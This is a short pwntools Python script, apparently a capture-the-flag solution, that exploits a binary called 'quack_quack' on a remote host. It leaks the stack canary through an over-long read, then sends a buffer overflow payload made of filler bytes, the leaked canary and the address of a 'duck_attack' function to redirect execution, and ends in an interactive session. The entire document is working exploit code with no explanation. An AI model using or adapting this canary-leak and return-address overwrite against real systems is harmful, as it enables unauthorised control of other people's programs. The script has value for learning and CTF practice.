from pwn import *
r=remote("94.237.57.68",55361)
elf=ELF("./quack_quack")
r.sendafter(">","Quack Quack ".rjust(0x65,"a"))
r.readuntil("Quack Quack ")
canary=u64((r.recv(7).rjust(8,p8(0))))
r.sendlineafter(">",p64(0xdeadbeefdeadbeef)*11+p64(canary)*2+p64(elf.sym.duck_attack))
r.interactive()
